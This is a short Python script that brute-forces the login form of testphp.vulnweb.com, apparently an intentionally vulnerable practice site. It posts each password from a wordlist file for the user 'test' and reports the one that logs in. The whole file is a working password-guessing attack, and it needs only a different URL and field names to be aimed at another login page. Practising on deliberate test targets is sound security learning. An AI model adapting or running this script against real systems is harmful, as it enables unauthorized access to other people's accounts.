import requests

url = 'http://testphp.vulnweb.com/userinfo.php'
arq = open('dic.txt','r').readlines()
for line in arq:
    password = line.strip()
    http = requests.post(url, data={'uname':'test','pass':password,'sub':'submit'})
    content = http.content
    if b"Logged into the system" in content:
        print("=========== [+] PASSWORD CRACKED: "+password+" =========")
        break
    else: 
        print("[-} Password invalid: "+password)